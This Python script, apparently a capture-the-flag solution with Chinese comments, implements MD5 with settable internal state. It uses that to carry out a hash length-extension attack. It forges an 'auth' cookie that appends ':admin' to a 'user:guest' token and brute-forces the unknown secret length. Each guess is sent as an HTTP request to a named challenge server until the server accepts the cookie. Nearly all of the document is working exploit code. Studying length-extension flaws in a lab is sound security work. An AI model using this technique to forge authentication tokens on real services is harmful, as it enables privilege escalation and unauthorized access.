import struct
import math
import requests
from pwn import *
import os
import hashlib
def left_rotate(x, n):
    """循环左移"""
    return ((x << n) | (x >> (32 - n))) & 0xFFFFFFFF

class MD5:
    def __init__(self,a=0x67452301,b=0xEFCDAB89,c=0x98BADCFE,d=0x10325476):
        # 初始化四个 32 位寄存器（小端序）
        self.A = a
        self.B = b
        self.C = c
        self.D = d
        
        # 存储原始消息长度（位）
        self.original_length = 0
        # 存储填充后的消息
        self.message = b''
        
        # 每轮使用的正弦函数值的绝对值的整数部分（64 个常量）
        self.K = [int(abs(math.sin(i + 1)) * 2**32) & 0xFFFFFFFF for i in range(64)]
        
        # 每轮循环左移的位数
        self.S = [
            7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22,
            5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20,
            4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23,
            6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21
        ]
        
    def padding(self, data):
        """填充消息：补1个1和若干个0，最后补64位原始长度"""
        # 原始长度（位）
        self.original_length = len(data) * 8
        
        # 先补一个 0x80 (10000000)
        message = data + b'\x80'
        
        # 补0直到长度 ≡ 448 (mod 512)，即字节长度 ≡ 56 (mod 64)
        while (len(message) * 8) % 512 != 448:
            message += b'\x00'
        
        # 最后补64位（8字节）的原始长度（小端序）
        message += struct.pack('<Q', self.original_length)
        
        return message
    
    def F(self, x, y, z):
        """第1轮非线性函数：(x & y) | (~x & z)"""
        return (x & y) | (~x & z)
    
    def G(self, x, y, z):
        """第2轮非线性函数：(x & z) | (y & ~z)"""
        return (x & z) | (y & ~z)
    
    def H(self, x, y, z):
        """第3轮非线性函数：x ^ y ^ z"""
        return x ^ y ^ z
    
    def I(self, x, y, z):
        """第4轮非线性函数：y ^ (x | ~z)"""
        return y ^ (x | ~z)
    
    def process_block(self, block):
        """处理一个 512 位（64字节）的数据块"""
        # 将64字节分成16个32位字（小端序）
        M = [struct.unpack('<I', block[i:i+4])[0] for i in range(0, 64, 4)]
        
        # 初始化当前块的哈希值
        a, b, c, d = self.A, self.B, self.C, self.D
        
        # 主循环（64轮）
        for i in range(64):
            if 0 <= i <= 15:  # 第1轮
                f = self.F(b, c, d)
                g = i
            elif 16 <= i <= 31:  # 第2轮
                f = self.G(b, c, d)
                g = (5 * i + 1) % 16
            elif 32 <= i <= 47:  # 第3轮
                f = self.H(b, c, d)
                g = (3 * i + 5) % 16
            else:  # 第4轮 (48-63)
                f = self.I(b, c, d)
                g = (7 * i) % 16
            
            # 计算新值
            temp = d
            d = c
            c = b
            b = (b + left_rotate((a + f + self.K[i] + M[g]) & 0xFFFFFFFF, self.S[i])) & 0xFFFFFFFF
            a = temp
        
        # 更新哈希值（模2^32加法）
        self.A = (self.A + a) & 0xFFFFFFFF
        self.B = (self.B + b) & 0xFFFFFFFF
        self.C = (self.C + c) & 0xFFFFFFFF
        self.D = (self.D + d) & 0xFFFFFFFF
    
    def update(self, data):
        """更新哈希对象"""
        if isinstance(data, str):
            data = data.encode('utf-8')
        
        self.message += data
        return self
    
    def digest(self):
        """返回二进制摘要（16字节）"""
        # 填充
        padded_message = self.padding(self.message)
        
        # 处理每个512位块
        for i in range(0, len(padded_message), 64):
            self.process_block(padded_message[i:i+64])
        
        # 拼接四个32位寄存器（小端序）
        result = struct.pack('<4I', self.A, self.B, self.C, self.D)
        return result
    
    def hexdigest(self):
        """返回十六进制字符串摘要（32字符）"""
        return self.digest().hex()
    def get_hash(self):
        return struct.pack('<4I', self.A, self.B, self.C, self.D)
    def reset(self):
        """重置状态"""
        self.__init__()


# ============ 使用示例 ============S

def md5(data):
    """便捷的 MD5 函数"""
    return MD5().update(data).hexdigest()
def tst():
    msg=os.urandom(8)
    assert(md5(msg)==hashlib.md5(msg).hexdigest())
def pad1(data,length):
    message = data + b'\x80'
    message += b'\x00'*(56-len(message))
    message += struct.pack('<Q', length)
    return message
def urlencode(data):
    s=""
    for each in data:
        if chr(each).isprintable():
            s+=chr(each)
        else:
            s+='%'+hex(each)[2:].zfill(2).upper()
    return s
tst()
text=bytes.fromhex("f7e560754de9f9dc4006db9ae564ee66")
a=u32(text[:4])
b=u32(text[4:8])
c=u32(text[8:12])
d=u32(text[12:16])
for length in range(1,2000):
    if length%30==0:
        print(length)
    block_num=1
    while 512*block_num-64<(11+length)*8:
        block_num+=1 
    md5=MD5(a,b,c,d)
    md5.process_block(pad1(b":admin",512*block_num+6*8))
    hashtext=md5.get_hash().hex()
    username=b'user:guest'+b'\x80'
    while ((len(username)+length) * 8) % 512 != 448:
        username += b'\x00'
    username+= struct.pack('<Q',(length+10)*8)
    username+=b":admin"
    cookie="auth="+urlencode(username)+"|"+hashtext
    #print(cookie)
    http=requests.get("http://web1.0ops.sjtu.cn:40033/",headers={"Cookie":cookie}).text
    response=http[:http.find("!")]
    if not "Invalid" in response:
        print(http,length)
        break
